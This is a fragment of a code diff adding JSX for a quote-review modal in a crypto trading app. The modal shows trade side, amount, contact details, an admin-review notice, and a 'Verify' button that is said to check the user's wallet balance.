+              <p className="text-primary font-mono text-sm">{quoteTokenInfo.baseToken.symbol}</p>
+            </div>
+          )}
+
+          <div className="space-y-3">
+            <div className="flex justify-between p-3 rounded-lg bg-white/5 border border-white/5">
+              <span className="text-muted-foreground">Side</span>
+              <Badge className={quoteSide === 'buy' ? 'bg-green-500/20 text-green-400' : 'bg-red-500/20 text-red-400'}>
+                {quoteSide.toUpperCase()}
+              </Badge>
+            </div>
+            <div className="flex justify-between p-3 rounded-lg bg-white/5 border border-white/5">
+              <span className="text-muted-foreground">Requested Amount</span>
+              <span className="font-mono font-bold">{quoteAmount} {quoteTokenInfo?.baseToken.symbol}</span>
+            </div>
+            {quotePhoneNumber && (
+              <div className="flex justify-between p-3 rounded-lg bg-white/5 border border-white/5">
+                <span className="text-muted-foreground">Phone</span>
+                <span className="text-sm font-mono">{quotePhoneNumber}</span>
+              </div>
+            )}
+            {quoteEmail && (
+              <div className="flex justify-between p-3 rounded-lg bg-white/5 border border-white/5">
+                <span className="text-muted-foreground">Email</span>
+                <span className="text-sm font-mono">{quoteEmail}</span>
+              </div>
+            )}
+          </div>
+
+          <div className="p-5 rounded-xl bg-primary/5 border border-primary/10 space-y-4">
+            <div className="flex gap-3 items-start">
+              <AlertCircle className="w-6 h-6 text-primary shrink-0 mt-1" />
+              <div className="space-y-3">
+                <h4 className="font-bold text-primary">Verification & Review</h4>
+                <p className="text-xs text-muted-foreground leading-relaxed">
+                  Our trading desk admins will review your quote request. You will be notified via your connected wallet or platform messages whether your request is accepted or rejected.
+                </p>
+                <p className="text-xs text-muted-foreground leading-relaxed">
+                  To ensure eligibility for this institutional trade, we must verify your current wallet balance. Click "Verify" to confirm your assets are sufficient for this trade request.
+                </p>
+              </div>
+            </div>
+          </div>
+
+          <div className="flex gap-3">
+            <Button variant="outline" className="flex-1 border-white/10" onClick={() => { setShowQuoteReviewModal(false); setShowQuoteModal(true); }} disabled={isVerifying}>
+              Back
+            </Button>
+            <Button className="flex-1 bg-gradient-to-r from-cyan-500 to-purple-600" onClick={handleConfirmQuote} disabled={isVerifying}>
+              {isVerifying ? <><Loader2 className="w-4 h-4 mr-2 animate-spin" /> Verifying...</> : 'Verify'}
+            </Button>
+          </div>
         </div>
       </Modal>
 
